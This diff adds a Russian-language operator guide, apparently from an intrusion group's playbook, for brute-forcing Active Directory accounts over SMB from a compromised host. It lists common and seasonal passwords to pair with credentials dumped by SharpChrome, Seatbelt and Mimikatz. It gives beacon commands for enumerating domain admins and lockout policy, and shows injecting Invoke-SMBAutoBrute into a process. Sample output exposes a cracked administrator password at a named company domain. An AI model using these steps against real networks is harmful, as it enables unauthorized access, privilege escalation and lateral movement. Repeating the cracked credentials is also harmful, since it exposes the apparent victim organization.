@@ -1,0 +1,114 @@
+```SMB AUTOBRUT
+Входными данными для проведений данной атаки являются исключительно пароли.
+   -   те, которые сдампились с браузера CharpChrome'ом
+   -   те, которые сдампились SeatBeltom
+   -   те, которые сдампились в процессе проведения работ внутри сети (мимикатцем итд)
+И вцелом любые другие, например найденные записанными в файлах
+   
+Если подобных паролей меньше чем мы можем запустить в брутфорс атаку - дополняем смело их из следующего списка наиболее частно встречающихся в корпоративной среде.
+
+Password1
+Hello123
+password
+Welcome1
+banco@1
+training
+Password123
+job12345
+spring
+food1234
+
+
+Также рекомендуем использовать списки паролей основывающиеся на временах года и текущем годе. Учитывая что пароли меняются раз в три месяца - можно брать "запас" для генерации такого листа.
+Например в Августе 2020 года мы создаем список следующего содержания
+
+June2020
+July2020
+August20
+August2020
+Summer20
+Summer2020
+June2020!
+July2020!
+August20!
+August2020!
+Summer20!
+Summer2020!
+
+Все пароли выше попадают либо в 3 из 4 требований к паролям Актив Директори (чего хватает для их установки пользователями), либо во все 4 требования.
+Прим. рассматриваем наиболее популярный вариант требований.
+
+
+   
+   Сценарий с домен администраторами
+1.   Собираем список доменных администраторов командой shell net group "domain admins" /dom
+   Полученные данные записываем в файл
+   admins.txt
+   
+2.   Заливаем этот файл на хост в папку C:\ProgramData
+
+3.   Запрашиваем информацию по доменной политике блокировки аккаунтов (защиты от брутфорса)
+   
+   beacon> shell net accounts /dom
+   
+
+    Tasked beacon to run: net accounts /dom
+    host called home, sent: 48 bytes
+    received output:
+
+
+   The request will be processed at a domain controller for domain shookconstruction.com.
+   Force user logoff how long after time expires?:       Never
+   Minimum password age (days):                          1
+   Maximum password age (days):                          42
+   Minimum password length:                              6
+   Length of password history maintained:                24
+   Lockout threshold:                                    Never
+   Lockout duration (minutes):                           30
+   Lockout observation window (minutes):                 30
+   Computer role:                                        BACKUP
+
+   Нас интересует параметр Lockout threshold который чаще всего содержит определенное числовое значение которое в дальнейшем мы должны использовать как параметр (в данном случае стоит Never - значит что защита от перебора паролей отключена.
+   В этом гайде в дальнейшем мы укажем значение 5 как ориентировочно чаще всего встречающееся.
+   Параметр Minimum password length указывает на минимальное допустимое количество символов пароля, требуется для фильтрации нашего "списка" паролей который мы будем задавать.
+   
+4. В исходном коде скрипта указываем домен в котором скрипт будет запускаться
+   -   строка             $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain","shookconstruction.com")
+
+5.   Импортируем и запускаем скрипт
+   powershell-import /tmp/Fast-Guide/Invoke-SMBAutoBrute.ps1
+   psinject 4728 x86 Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
+   -   4728 в данном случае это текущий пид, а х86 его разрядность
+   -   Список паролей состоит из одного который у нас был "найден" и двух из списка популярных паролей
+   
+6.   Смотрим за ходом выполнения скрипта и видим результат
+   
+
+    Success! Username: Administrator. Password: 1qazXDR%+
+    Success! Username: CiscoDirSvcs. Password: 1qazXDR%+
+
+
+   
+   Мы сбрутили двух администраторов домена.
+   
+========================================================================
+   
+   Сценарий без указания списка пользователей отличается только двумя вещами.
+   -   psinject 4728 x86 Invoke-SMBAutoBrute -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5
+      Мы не указываем параметры UserList и ShowVerbose. Отсутствие первого означает то что перебор будет проводиться по ВСЕМ пользователям домена, отсутствие второе указывает на то что выводится будут только УСПЕШНЫЕ результаты.
+   
+   Дожидаться в видеогайде окончания работы скрипта который будет перебирать все пары пользователь/пароль в домене не буду, покажу только вывод.
+   
+   
+
+    Success! Username: Administrator. Password: 1qazXDR%+
+    Success! Username: CiscoDirSvcs. Password: 1qazXDR%+
+    Success! Username: support. Password: 1qazXDR%+
+    Success! Username: accountingdept. Password: 1qazXDR%+   
+
+
+   
+   Как видите мы смогли найти аккаунты других пользователей которые могут быть полезны для дальнейшего продвижения по сети и поднятия прав.
+
+   Если позитивного результата не будет, можно повторить через некоторое время (оптимально умножить на два параметр Lockout duration перед следующей попыткой) с новым списком паролей.
+   Окончание работы скрипта будет отмечено выводом в бикон сообщения
